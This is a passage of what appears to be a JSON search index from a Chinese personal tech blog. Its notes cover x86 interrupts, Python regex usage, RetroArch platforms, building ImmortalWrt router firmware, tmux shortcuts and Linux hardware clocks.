<li>\u4e2d\u65ad\u7c7b\u578b\u3002\u51e0\u79cd\u4e0d\u540c\u7684\u8bf4\u6cd5\uff0c\u542b\u4e49\u662f\u4e00\u6837\u7684<ul> <li>\u5916\u90e8\u4e2d\u65ad\uff0c\u5185\u90e8\u4e2d\u65ad</li> <li>\u5f02\u6b65\u4e2d\u65ad\uff0c\u540c\u6b65\u4e2d\u65ad</li> <li>\u4e2d\u65ad\uff0c\u5f02\u5e38</li> </ul> </li> <li>\u4e2d\u65ad\u63cf\u8ff0\u7b26</li> <li>\u4e2d\u65ad\u63cf\u8ff0\u7b26\u8868IDT, IDTR</li> </ul> <p>\u4e2d\u65ad\u4e0a\u4e0b\u6587\u5207\u6362\u8fc7\u7a0b</p>","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/09/28/2022-09-28-python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/","title":"python\u6b63\u5219\u8868\u8fbe\u5f0f","text":"<p>python\u6b63\u5219\u8868\u8fbe\u5f0f</p> <ul> <li>re \u2014 Regular expression operations \u2014 Python 3.9.5 documentation</li> <li> <p>Regular Expression HOWTO \u2014 Python 3.9.5 documentation</p> </li> <li> <p>re\u662fpython\u7684\u6807\u51c6\u5e93\uff0c\u4f4d\u4e8e<code>Lib/re.py</code></p> </li> <li>regex\u8868\u793aregular expression\u3002\u6b63\u5219\u8868\u8fbe\u5f0f\u4f1a\u88ab\u7f16\u8bd1\u6210\u4e00\u4e2a\u5b57\u8282\u7801\uff0cpython\u5e95\u5c42\u8c03\u7528C\u7f16\u5199\u7684\u6b63\u5219\u5f15\u64ce\u6267\u884c\u8be5\u5b57\u8282\u7801\u3002\u53ef\u4ee5\u4f18\u5316\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u4e66\u5199\uff0c\u4ece\u800c\u4f7f\u5f97\u5b57\u8282\u7801\u7684\u6267\u884c\u901f\u5ea6\u66f4\u5feb\u3002</li> </ul>","tags":["python","re"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/09/28/2022-09-28-python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/#quick-reference","title":"quick reference","text":"<pre><code>RE = r'pattern'\nre_obj = re.compile(RE)\n\n#regex obj or re.(RE, ..)\nmatch\nsearch\nfindall   #return string list, not match obj\nfiniter\n\nsplit\nsub       #\u66ff\u6362\nsubn\n\n#match obj\ngroup    #group(0)\u8fd4\u56de\u5339\u914d\u7684\u6574\u4e2a\u5b57\u7b26\u4e32\uff0cgroup(1)\u8fd4\u56de\u7b2c\u4e00\u4e2agroup\ngroupdict\nstart\nend\n</code></pre> <ul> <li><code>m.span([group])</code></li> <li>\u9ed8\u8ba4group\u4e3a0\uff0c\u5373\u6574\u4e2a\u5339\u914d</li> <li>\u8fd4\u56de(m.start(group),\u00a0m.end(group))</li> <li>if\u00a0group\u00a0did not contribute to the match, this is\u00a0<code>(-1,\u00a0-1)</code></li> </ul>","tags":["python","re"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/09/28/2022-09-28-python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/#example","title":"example","text":"<p>match\u8fd4\u56dematch object <pre><code>import re\n\npattern = '^a...s$'\ntest_string = 'abyss'\nresult = re.match(pattern, test_string)\n\nif result:\n  print(\"Search successful.\")\nelse:\n  print(\"Search unsuccessful.\") \n</code></pre></p> <p>findall\u8fd4\u56de\u5b57\u7b26\u4e32\u5217\u8868 <pre><code># Program to extract numbers from a string\n\nimport re\n\nstring = 'hello 12 hi 89. Howdy 34'\npattern = '\\d+'\n\nresult = re.findall(pattern, string) \nprint(result)\n\n# Output: ['12', '89', '34']\n</code></pre></p>","tags":["python","re"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/09/28/2022-09-28-python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/#group","title":"group","text":"<p><code>(...)</code> \u5339\u914d\u751f\u6210\u4e00\u4e2agroup\u3002\u5e76\u4e14\u53ef\u4ee5\u5728\u540e\u9762\u7684\u5b57\u7b26\u4e32\u4e2d\u4f7f\u7528<code>\\number</code>\u5f15\u7528</p> <p><code>(?...)</code> - <code>(?:...)</code>\uff1anon-capturing\uff0c\u4ea7\u751f\u7684group\u76f8\u5f53\u4e8e\u4f1a\u88ab\u5ffd\u7565 - <code>(?P&lt;key&gt;...)</code>\uff1a\u4ea7\u751f\u4e00\u4e2a\u547d\u540dgroup\uff0c\u901a\u8fc7goup</p>","tags":["python","re"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/09/28/2022-09-28-python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/#reference-group","title":"reference group","text":"<ul> <li>\u53ef\u4ee5\u5728\u5b9a\u4e49pattern\u65f6\u5f15\u7528group\u5185\u5bb9</li> <li>\u53ef\u4ee5\u5728\u5339\u914d\u7684match object\u91cc\u83b7\u53d6group</li> <li>\u53ef\u4ee5\u5728sub\u66ff\u6362\u51fd\u6570\u4e2d\uff0c\u5f15\u7528group\u4f5c\u4e3a\u66ff\u4ee3\u5b57\u7b26\u4e32</li> </ul> Context of reference to group \u201cquote\u201d Ways to reference it in the same pattern itself - <code>(?P=quote)</code>\u00a0(as shown) - <code>\\1</code> when processing match object\u00a0m - <code>m.group('quote')</code> - <code>m.end('quote')</code>\u00a0(etc.) in a string passed to the\u00a0repl\u00a0argument of\u00a0<code>re.sub()</code> - <code>\\g&lt;quote&gt;</code> - <code>\\g&lt;1&gt;</code> - <code>\\1</code> example <ul> <li>\u5339\u914d\u4e00\u4e2a\u88ab\u5f15\u53f7\u62ec\u8d77\u6765\u7684\u5b57\u7b26\u4e32\uff1a<code>(?P&lt;quote&gt;['\"]).*?(?P=quote)</code></li> <li>\u66ff\u6362\u6389\u5339\u914d\u7684group\uff0c\u65b0\u503c\u5f15\u7528\u4e86group <pre><code>import re\n\n# \u793a\u4f8b\u5b57\u7b26\u4e32\ntext = \"Name: John, Age: 30, City: New York\"\n\n# \u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d Name \u548c Age\uff0c\u5e76\u66ff\u6362\u4e3a\u65b0\u7684\u503c\nresult = re.sub(r\"(Name: )(\\w+), (Age: )(\\d+)\", r\"\\1Alice, \\325\", text)\n\nprint(result)\n</code></pre></li> </ul>","tags":["python","re"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/09/28/2022-09-28-python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/#lookahead-assertion","title":"lookahead assertion","text":"<pre><code>(?=...) #\u5339\u914d\u5219\u7ee7\u7eed\n(?!...) #\u4e0d\u5339\u914d\u5219\u7ee7\u7eed\n</code></pre> <p><code>(?=...)</code> Matches if\u00a0<code>...</code>\u00a0matches next, but doesn\u2019t consume any of the string. This is called a\u00a0lookahead assertion. For example,\u00a0<code>Isaac\u00a0(?=Asimov)</code>\u00a0will match\u00a0<code>'Isaac\u00a0'</code>\u00a0only if it\u2019s followed by\u00a0<code>'Asimov'</code>.</p> <p><code>(?!...)</code> Matches if\u00a0<code>...</code>\u00a0doesn\u2019t match next. This is a\u00a0negative lookahead assertion. For example,\u00a0<code>Isaac\u00a0(?!Asimov)</code>\u00a0will match\u00a0<code>'Isaac\u00a0'</code>\u00a0only if it\u2019s\u00a0not\u00a0followed by\u00a0<code>'Asimov'</code>.</p> <p>example</p> <pre><code>r'.*[.](?!bat$)[^.]*$'  #\u5339\u914d\u6240\u6709\u975e*.bat\u6587\u4ef6\n</code></pre>","tags":["python","re"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/09/28/2022-09-28-python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/#\u5176\u5b83","title":"\u5176\u5b83","text":"","tags":["python","re"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/09/28/2022-09-28-python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/#verbose","title":"VERBOSE","text":"<pre><code>pat = re.compile(r\"\"\"\n \\s*                 # Skip leading whitespace\n (?P&lt;header&gt;[^:]+)   # Header name\n \\s* :               # Whitespace, and a colon\n (?P&lt;value&gt;.*?)      # The header's value -- *? used to\n                     # lose the following trailing whitespace\n \\s*$                # Trailing whitespace to end-of-line\n\"\"\", re.VERBOSE)\n</code></pre>","tags":["python","re"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/09/28/2022-09-28-python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/#greedy-vs-non-greedy-vs-possessive","title":"Greedy vs Non-Greedy vs Possessive","text":"<ul> <li>greedy: \u9ed8\u8ba4\u60c5\u51b5<code>*, +, ?</code>\u90fd\u4f1a\u5c3d\u53ef\u80fd\u5339\u914d\u591a\u7684\u5b57\u7b26</li> <li>non-greedy\uff1a\u4f7f\u7528<code>?</code>\u4fee\u9970\uff0c\u5373<code>*?</code>,\u00a0<code>+?</code>,\u00a0<code>??</code>\uff0c\u5339\u914d\u5c3d\u53ef\u80fd\u5c11\u7684\u5b57\u7b26</li> <li>possessive\uff1a\u5339\u914d\u5c3d\u53ef\u80fd\u591a\uff0c\u5e76\u4e14\u4e0d\u5efa\u7acbbacktrace\u70b9\uff0c\u53ef\u80fd\u5bfc\u81f4\u5339\u914d\u5931\u8d25\u3002</li> <li>\u6bd4\u5982<code>aaaa</code>\uff0c<code>a*a</code>\u4e2d\u7684<code>a*</code>\u5339\u914d\u5230\u7b2c4\u4e2aa\u540e\uff0c\u4f1a\u5bfc\u81f4a\u5339\u914d\u5931\u8d25\uff0c\u56e0\u6b64\u4f1a\u56de\u6eaf\u3002\u6700\u7ec8<code>a*</code>\u5339\u914d3\u4e2aa\uff0c\u6700\u540e\u4e00\u4e2aa\u5355\u72ec\u5339\u914d\u3002</li> <li>\u4f46\u662f<code>a*+a</code>\u6ca1\u6709\u8fd9\u4e2a\u56de\u6eaf\u8fc7\u7a0b\uff0c\u5bfc\u81f4\u8868\u8fbe\u5f0f\u5339\u914d\u5931\u8d25</li> </ul> <pre><code>&gt;&gt;&gt; s = '&lt;html&gt;&lt;head&gt;&lt;title&gt;Title&lt;/title&gt;'\n&gt;&gt;&gt; print(re.match('&lt;.*&gt;', s).group())\n&lt;html&gt;&lt;head&gt;&lt;title&gt;Title&lt;/title&gt;\n\n&gt;&gt;&gt; print(re.match('&lt;.*?&gt;', s).group())\n&lt;html&gt;\n</code></pre>","tags":["python","re"]},{"location":"%E5%B7%A5%E5%85%B7/2022/09/29/2022-09-29-retroarch%E9%85%8D%E7%BD%AE/","title":"retroarch\u914d\u7f6e","text":"<p>RetroArch Starter Guide \u2013 Retro Game Corps</p> <p>retroarch\u662f\u4e00\u4e2a\u6a21\u62df\u5668\u524d\u7aef\uff0c\u4e0d\u540c\u7684\u6a21\u62df\u5668\u4ee5core\u7684\u5f62\u5f0f\u5d4c\u5165retro\u3002retroarch\u76f8\u5bf9\u4e8e\u5355\u72ec\u7684\u6a21\u62df\u5668\u6765\u8bf4\u597d\u5904\u5982\u4e0b</p> <ul> <li>\u8de8\u5e73\u53f0\u3002retroarch\u652f\u6301\u975e\u5e38\u591a\u7684\u5e73\u53f0\u3002\u7531\u4e8ecore\u662f\u52a8\u6001\u94fe\u63a5\u5e93\u7684\u5f62\u5f0f\u5d4c\u5165retroarch\u7684\uff0c\u76f8\u5f53\u4e8e\u89e3\u51b3\u4e86\u4e0d\u540ccore\u7684\u8de8\u5e73\u53f0\u95ee\u9898\u3002</li> <li>\u652f\u6301\u5168\u5c40\u7684\u6309\u952e\u6620\u5c04\u3002\u4e0d\u7528\u4e3a\u6bcf\u4e2a\u6a21\u62df\u5668\u8bbe\u7f6e\u624b\u67c4\uff0c\u5feb\u6377\u952e\u7b49\u7b49\u914d\u7f6e\u3002</li> <li>shader and filters\u3002\u53ef\u4ee5\u5b9e\u73b0\u4e00\u4e9b\u7279\u522b\u7684\u89c6\u89c9\u6548\u679c\uff0c\u6bd4\u5982</li> </ul>","tags":["retroarch"]},{"location":"%E5%B7%A5%E5%85%B7/2022/09/29/2022-09-29-retroarch%E9%85%8D%E7%BD%AE/#\u53c2\u8003","title":"\u53c2\u8003","text":"<p>RetroArch\u8857\u673a\u6a21\u62df\u6559\u7a0b\u3010\u4eb2\u6d4b\u6709\u6548\u3011 - \u7b80\u4e66 (jianshu.com) EmuELEC\u4e2d\u6587\u7f51 - EmuELEC\u4f7f\u7528\u6307\u5357\u4e94\u4e4b\u8857\u673a\u6a21\u62df\u5668\u4f7f\u7528\u7b80\u4ecb EmuELEC\u4e2d\u6587\u7f51 - EmuELEC\u4f7f\u7528\u6307\u5357\u4e00\u4e4b\u65b0\u624b\u5feb\u901f\u4e0a\u624b\u6307\u5357</p>","tags":["retroarch"]},{"location":"%E5%B7%A5%E5%85%B7/2022/09/29/2022-09-29-retroarch%E9%85%8D%E7%BD%AE/#\u5e73\u53f0\u5217\u8868","title":"\u5e73\u53f0\u5217\u8868","text":"<pre><code>name_list = [\\\n    \"(1989) NEC - PC Engine\",\n\n    \"(1988) Sega - MegaDrive\",\n    \"(1994) Sega - Saturn\",\n    \"(1998) Sega - DreamCast\",\n\n    \"(1989) Nintendo - GB\",\n    \"(1998) Nintendo - GBC\",\n    \"(2001) Nintendo - GBA\",\n    \"(2004) Nintendo - NDS\",\n    \"(2011) Nintendo - 3DS\",\n\n    \"(1983) Nintendo - FC\",\n    \"(1990) Nintendo - SFC\",\n    \"(1996) Nintendo - N64\",\n    #(2001) \"Nintendo - NGC\",\n    \"(2006) Nintendo - Wii\",\n    # \"(2012) Nintendo - WiiU\",\n\n    \"(2004) Sony - PSP\",\n    # \"(2011) Sony - PSV\",\n    \"(1994) Sony - PS1\",\n    \"(2000) Sony - PS2\",\n    # \"(2006) Sony - PS3\",\n    # \"(2013) Sony - PS4\",\n]\n</code></pre> <p>\u4e16\u5609List of Sega video game consoles - Wikipedia \u4e3b\u673a</p> <ul> <li>MD: Mega Drive, 1988</li> <li>SS: Sega Saturn, 1994</li> <li>DC: Dreamcast, 1998, 6</li> </ul> <p>\u7d22\u5c3cPlayStation - Wikipedia \u638c\u673a - PSP: 2004, 7 - PSV: 2011 \u4e3b\u673a - PS1: 1994, 5 - PS2: 2000, 6 - PS3: 2006, 7 - PS4: 2013, 8</p> <p>\u4efb\u5929\u5802Nintendo video game consoles - Wikipedia \u638c\u673a GB(1989), GBC(1998), GBA(2001)</p> <p>NDS/DS(2004) 3DS(2011)</p> <p>\u4e3b\u673a FC/NES:1983 SFC/SNES: 1990 N64: 1996 NGC/game cube: 2001 WII 2006 WIIU 2012 Switch</p> <p>TurboGrafx-16 - Wikipedia   NEC 1989   Japan in 1987 and in North America in 1989.</p> <p>\u8857\u673a - neogeo: snk, \u62f3\u7687\uff0c\u5408\u91d1\u5f39\u5934 - cps1,2,3 - mame</p> <ul> <li>oldman</li> </ul> <pre><code>SFC       201M    x\nGBA_499   3.6G\n\nNGC       15G\nWii       120G\n\nSS        7.9G\nDC        17.3G   x\n\nPS1       37.1G\nPS2       302G/20G\nPSP       319G/10.4G\n</code></pre> <ul> <li>retroarch\u6574\u5408\u5305</li> </ul> <pre><code>FC        66M \nSFC       619M\nGB[C] 100M\nGBA       2.26G   \nNDS       3.91G\n3DS       25.6G\nN64       637M\nNGC       4.53G\nWii       53.4G\nWiiU\n\nMD        417M\nSS        4.73G\nDC        22G\n\nPS1       18.8G\nPS2       59.5G\nPSP       21.5G\n\nPCE*  1.49G\n3DO       3.56G\nAracade   4.36G\n</code></pre>","tags":["retroarch"]},{"location":"%E6%8A%98%E8%85%BE/2022/10/03/2022-10-03-%E5%B0%9D%E8%AF%95%E9%9D%9E%E5%AE%98%E6%96%B9openwrt/","title":"\u5c1d\u8bd5\u975e\u5b98\u65b9openwrt","text":"","tags":["openwrt","immortalwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/10/03/2022-10-03-%E5%B0%9D%E8%AF%95%E9%9D%9E%E5%AE%98%E6%96%B9openwrt/#\u8bf4\u660e","title":"\u8bf4\u660e","text":"<p>\u6211\u7684\u7ea2\u7c73ac2100\u4e0d\u77e5\u9053\u600e\u4e48\u56de\u4e8b\uff0c\u4f7f\u7528\u81ea\u5df1\u7f16\u8bd1\u7684\u56fa\u4ef6\uff0c\u65e0\u6cd5\u5f00\u542f5G\u65e0\u7ebf\u3002radio1\u663e\u793anot active\uff0c\u5e76\u4e14\u4e3a802.11n\u534f\u8bae\u3002\u5148\u540e\u5c1d\u8bd5\u7f16\u8bd122.03-rc6, 21.02\u7a33\u5b9a\u7248\u90fd\u662f\u5982\u6b64\u3002\uff08\u5b98\u65b9\u7a33\u5b9a\u7248\u662f\u6709\u7684\uff09(\u60f3\u5230\u4e00\u4e9b\u7b2c\u4e09\u65b9\u7684openwrt\u8bf4\u9488\u5bf9\u56fd\u5185\u8fdb\u884c\u4e86\u4f18\u5316\uff0c\u56e0\u6b64\u60f3\u5c1d\u8bd5\u4e0b\u7b2c\u4e09\u65b9\u7684openwrt</p>","tags":["openwrt","immortalwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/10/03/2022-10-03-%E5%B0%9D%E8%AF%95%E9%9D%9E%E5%AE%98%E6%96%B9openwrt/#\u56fd\u5185\u4e09\u5927\u5b9a\u5236\u5316openwrt","title":"\u56fd\u5185\u4e09\u5927\u5b9a\u5236\u5316openwrt","text":"<p>lienol\u9879\u76ee\uff1a\uff1ahttps://github.com/Lienol/openwrt</p> <p>lean\u9879\u76ee\uff1ahttps://github.com/coolsnowwolf/lede</p> <p>immortalwrt\uff1ahttps://github.com/immortalwrt/immortalwrt </p>","tags":["openwrt","immortalwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/10/03/2022-10-03-%E5%B0%9D%E8%AF%95%E9%9D%9E%E5%AE%98%E6%96%B9openwrt/#immortalwrt","title":"Immortalwrt","text":"<p>\u7f16\u8bd1\u65f6\u53d1\u73b0\u591a\u4e86\u4e00\u4e9b\u5e94\u7528\uff0c\u5e76\u4e14\u8c8c\u4f3c\u81ea\u52a8\u52fe\u9009\u4e86\u4e00\u4e9b\u5e94\u7528\uff0c\u6bd4\u5982ssr\u3002 \u5c1d\u8bd5\u4f7f\u7528immortalwrt\uff0c\u7f16\u8bd1\u8fc7\u7a0b\u611f\u89c9\u66f4\u5feb\u4e86\uff1f \u7528sysupgrade\u56fa\u4ef6\u66f4\u65b0\u5b98\u65b9openwrt\u540e\uff0c5G wifi\u786e\u5b9e\u6062\u590d\u4e86\u3002</p>","tags":["openwrt","immortalwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/10/03/2022-10-03-%E5%B0%9D%E8%AF%95%E9%9D%9E%E5%AE%98%E6%96%B9openwrt/#\u5b98\u65b9\u56fa\u4ef6\u4e0b\u8f7d","title":"\u5b98\u65b9\u56fa\u4ef6\u4e0b\u8f7d","text":"<p>ImmortalWrt Firmware Selector</p>","tags":["openwrt","immortalwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/10/03/2022-10-03-%E5%B0%9D%E8%AF%95%E9%9D%9E%E5%AE%98%E6%96%B9openwrt/#ipv6\u95ee\u9898","title":"ipv6\u95ee\u9898","text":"<p>\u53d1\u73b0pppoe\u540e\uff0cwan_6\u6ca1\u6709ipv6\u5730\u5740\uff0c\u786e\u5b9a\u914d\u7f6e\u6ca1\u6709\u95ee\u9898\u540e\uff0c\u5076\u7136\u53d1\u73b0\u662f\u6ca1\u6709odhcpd\u5bfc\u81f4\u7684\uff08WAN6\u63a5\u53e3\u663e\u793a\u4e0d\u652f\u6301\u7684\u534f\u8bae\uff0c\u5bf9\u6bd4\u539f\u672c\u53d1\u73b0dhcp\u914d\u7f6e\u4e2d\u53ea\u6709dnsmasq\uff0c\u6ca1\u6709odhcpd\uff09</p> <p>\u5bf9\u6bd4\u5b98\u65b9\u7248\u672c\uff0c\u53d1\u73b0\u9700\u8981\u5728make menuconfig\u65f6\uff0c\u5728Network\u7c7b\u522b\u4e2d\u5f00\u542f</p> <ul> <li>odhcp6c</li> <li>odhcpd-ipv6only</li> </ul> <p>\u5f00\u542f\u540e\uff0cipv6\u6062\u590d\u4e86\u6b63\u5e38</p>","tags":["openwrt","immortalwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/10/03/2022-10-03-%E5%B0%9D%E8%AF%95%E9%9D%9E%E5%AE%98%E6%96%B9openwrt/#fullcone-nat","title":"FullCone NAT","text":"<p>immortalwrt\u6709\u4e2aTurbo ACC\u8f6f\u4ef6\u652f\u6301\u8bbe\u7f6e\u5168\u9525\u578bNAT\uff0c\u8fd9\u5bf9P2P\u8054\u673a\u5f88\u53cb\u597d</p> <p></p>","tags":["openwrt","immortalwrt"]},{"location":"%E5%B7%A5%E5%85%B7/2022/10/05/2022-10-05-tmux/","title":"tmux","text":"<p>tmux</p>","tags":["tmux"]},{"location":"%E5%B7%A5%E5%85%B7/2022/10/05/2022-10-05-tmux/#\u57fa\u672c","title":"\u57fa\u672c","text":"","tags":["tmux"]},{"location":"%E5%B7%A5%E5%85%B7/2022/10/05/2022-10-05-tmux/#\u914d\u7f6e\u6587\u4ef6","title":"\u914d\u7f6e\u6587\u4ef6","text":"<p>\u914d\u7f6e\u6587\u4ef6: /etc/tmux.conf, ~/.tmux.conf</p>","tags":["tmux"]},{"location":"%E5%B7%A5%E5%85%B7/2022/10/05/2022-10-05-tmux/#\u7ec4\u5408\u952e","title":"\u7ec4\u5408\u952e","text":"<p>\u7ec4\u5408\u952e\uff1a\u9ed8\u8ba4\u662fctrl-b\u3002\u4fee\u6539\u7ec4\u5408\u952e\uff1a</p> <pre><code>tmux set - g prefix C-x\n</code></pre>","tags":["tmux"]},{"location":"%E5%B7%A5%E5%85%B7/2022/10/05/2022-10-05-tmux/#session","title":"session","text":"<p>\u521b\u5efasession</p> <pre><code>tmux\ntmux new -s session_name\n</code></pre> <p>\u5220\u9664session</p> <pre><code>ctrl-b :kill-session\nctrl-b d    #\u4e34\u65f6\u9000\u51fa\n</code></pre> <p>\u5217\u51fasession\uff0c\u5e76\u8fdb\u5165</p> <pre><code>tmux ls\ntmux a #\u81ea\u52a8\u8fdb\u5165\u6700\u8fd1\u4e00\u4e2a\ntmux a -t session_name\ntmux kill-session -t session_name\n</code></pre>","tags":["tmux"]},{"location":"%E5%B7%A5%E5%85%B7/2022/10/05/2022-10-05-tmux/#tmux\u547d\u4ee4\u884c","title":"tmux\u547d\u4ee4\u884c","text":"<p>\u5728tmux\u7a97\u53e3\uff0c\u8f93\u5165tmux\u547d\u4ee4</p> <pre><code>ctrl-b :\n</code></pre>","tags":["tmux"]},{"location":"%E5%B7%A5%E5%85%B7/2022/10/05/2022-10-05-tmux/#\u7a97\u53e3\u7ba1\u7406","title":"\u7a97\u53e3\u7ba1\u7406","text":"","tags":["tmux"]},{"location":"%E5%B7%A5%E5%85%B7/2022/10/05/2022-10-05-tmux/#window","title":"window","text":"<pre><code>#\u521b\u5efa\nctrl-b c    #\u521b\u5efa\u65b0\u7684\u7a97\u53e3\nctrl-b &amp;    #\u5220\u9664\u5f53\u524d\u7a97\u53e3\n\n#\u79fb\u52a8\nctrl-b p    #\u5207\u6362\u4e0a\u4e00\u4e2a\nctrl-b n\n\nctrl-b f    #\u67e5\u627e\u5173\u952e\u5b57\n</code></pre> <p>\u8fd8\u53ef\u4ee5\u901a\u8fc7\u547d\u4ee4</p> <pre><code>ctrl-b :kill-window\n</code></pre>","tags":["tmux"]},{"location":"%E5%B7%A5%E5%85%B7/2022/10/05/2022-10-05-tmux/#pane","title":"pane","text":"<pre><code>#\u521b\u5efa\nctrl-b \"    #\u4e0a\u4e0b\u5207\u5206\nctrl-b %    #\u5de6\u53f3\u5207\u5206\nctrl-b x    #\u5220\u9664\n\n#\u5207\u6362pane\nctrl-b o    #\u987a\u5e8f\u904d\u5386pane\nctrl-b \u65b9\u5411\u952e  #\u65b9\u5411\u952e\u79fb\u52a8\n\nctrl-b z  #zoom\n\n#\u79fb\u52a8\n</code></pre>","tags":["tmux"]},{"location":"%E5%B7%A5%E5%85%B7/2022/10/05/2022-10-05-tmux/#\u5176\u5b83","title":"\u5176\u5b83","text":"","tags":["tmux"]},{"location":"%E5%B7%A5%E5%85%B7/2022/10/05/2022-10-05-tmux/#\u4e0d\u8981\u786e\u8ba4","title":"\u4e0d\u8981\u786e\u8ba4","text":"<pre><code>\u279c  ~ tmux list-keys | grep confirm-before\nbind-key    -T prefix       &amp;                     confirm-before -p \"kill-window #W? (y/n)\" kill-window\nbind-key    -T prefix       x                     confirm-before -p \"kill-pane #P? (y/n)\" kill-pane\n</code></pre> <p>\u5c06&amp;\u548cx\u91cd\u65b0\u6620\u5c04\u5373\u53ef</p> <pre><code>bind-key &amp; kill-window\nbind-key x kill-pane\n</code></pre>","tags":["tmux"]},{"location":"%E5%B7%A5%E5%85%B7/2022/10/05/2022-10-05-tmux/#\u9f20\u6807\u6eda\u8f6e","title":"\u9f20\u6807\u6eda\u8f6e","text":"<p>windows terminal\u4e2d\u5982\u4f55\u6eda\u52a8\u9f20\u6807</p> <pre><code>tmux set -g mouse on\n</code></pre>","tags":["tmux"]},{"location":"%E5%B7%A5%E5%85%B7/2022/10/05/2022-10-05-tmux/#swap-window","title":"swap window","text":"<p>prefxi:\u8fdb\u5165\u547d\u4ee4\u884c</p> <pre><code>swap-window -s 3 -t 1   #window number 3 and window number 1 swap their positions.\nswap-window -t 0    #\u5c06\u5f53\u524d\u7a97\u53e3\u548ctop\u7a97\u53e3\u4ea4\u6362\nmove-window -t 0    #In the unlikely case of having no window at index 0\n</code></pre> <p>\u8bbe\u7f6e\u5feb\u6377\u952e</p> <pre><code>bind-key -n C-S-Left swap-window -t -1\\; select-window -t -1\nbind-key -n C-S-Right swap-window -t +1\\; select-window -t +1\n</code></pre>","tags":["tmux"]},{"location":"%E5%B7%A5%E5%85%B7/2022/10/05/2022-10-05-tmux/#\u9ed8\u8ba4\u8def\u5f84","title":"\u9ed8\u8ba4\u8def\u5f84","text":"<p>tmux\u9ed8\u8ba4\u8def\u5f84\u662f\u521b\u5efatmux\u8fdb\u7a0b\u65f6\u7684\u8def\u5f84\uff0c\u4e4b\u540e\u521b\u5efa\u7a97\u53e3\u548cpanel\u90fd\u9ed8\u8ba4\u662f\u8be5\u8def\u5f84\u3002\u4f46\u6709\u65f6\u6211\u4eec\u5e0c\u671b\u80fd\u591f\u66f4\u6539\u9ed8\u8ba4\u8def\u5f84\u3002\u901a\u8fc7attach-session\u547d\u4ee4\u66f4\u6539\u3002 \u5e76\u4e14\u521b\u5efapanel\u65f6\uff0c\u4e00\u822c\u5e0c\u671b\u590d\u7528\u5f53\u524d\u8def\u5f84\u3002\u53ef\u4ee5\u5728\u5bf9\u5e94\u5feb\u6377\u952e\u540e\u6dfb\u52a0<code>-c</code>\u53c2\u6570\u5373\u53ef</p> <pre><code>bind M-c attach-session -c \"#{pane_current_path}\" # alt-c, to change current path\n\n# @ pane\n# split current window horizontally\nbind _ split-window -v -c \"#{pane_current_path}\"\n# split current window vertically\nbind - split-window -h -c \"#{pane_current_path}\"\n</code></pre>","tags":["tmux"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/10/16/2022-10-16-linux%E6%97%B6%E9%92%9F%E4%BB%8B%E7%BB%8D/","title":"linux\u65f6\u949f\u4ecb\u7ecd","text":"<p>linux\u4e2d\u65f6\u949f\u7684\u5b9e\u73b0\u4ecb\u7ecd</p> <ul> <li>time(7) - Linux manual page (man7.org)   !!!! <p>High-resolution timers     Before Linux 2.6.21, the accuracy of timer and sleep system calls     (see below) was also limited by the size of the jiffy.</p> <p>\u200b    Since Linux 2.6.21, Linux supports high-resolution timers (HRTs), \u200b    optionally configurable via CONFIG_HIGH_RES_TIMERS.  On a system \u200b    that supports HRTs, the accuracy of sleep and timer system calls \u200b    is no longer constrained by the jiffy, but instead can be as \u200b    accurate as the hardware allows (microsecond accuracy is typical \u200b    of modern hardware).  You can determine whether high-resolution \u200b    timers are supported by checking the resolution returned by a \u200b    call to clock_getres(2) or looking at the \"resolution\" entries in \u200b    /proc/timer_list.</p> <p>\u200b    HRTs are not supported on all hardware architectures.  (Support \u200b    is provided on x86, arm, and powerpc, among others.)</p> </li> <li>!!! rtc(4) - Linux manual page (man7.org)</li> <li>RTCs(Real Time Clocks)\u6307PC\u7b49\u8bbe\u5907\u4e0a\u7684\u4e00\u5757\u786c\u4ef6\u65f6\u949f\uff0c\u4e00\u822c\u4f7f\u7528\u7ebd\u6263\u7535\u6c60\u4f9b\u7535\u3002\u8bb0\u5f55\u4e86\"wall clock\"\u65f6\u95f4\uff08\u79bbPOSIX Epoch\u7684\u79d2+\u5fae\u79d2\u6570\uff09<ul> <li>\u901a\u8fc7ioctrl\u6765\u63a7\u5236</li> <li>\u4e00\u4e9bRTCs\u652f\u6301alarm\u4e2d\u65ad\uff0c\u5468\u671f\u4e2d\u65ad</li> <li>Hardware Clock: also called the hardware clock, the real time clock, the RTC, the BIOS clock, and the CMOS clock.   https://man7.org/linux/man-pages/man8/hwclock.8.html#:~:text=Clocks%20in%20a%20Linux%20System <p>The most normal way is to do I/O to the rtc device        special file, which is presumed to be driven by the rtc device        driver. </p> </li> </ul> </li> <li>System 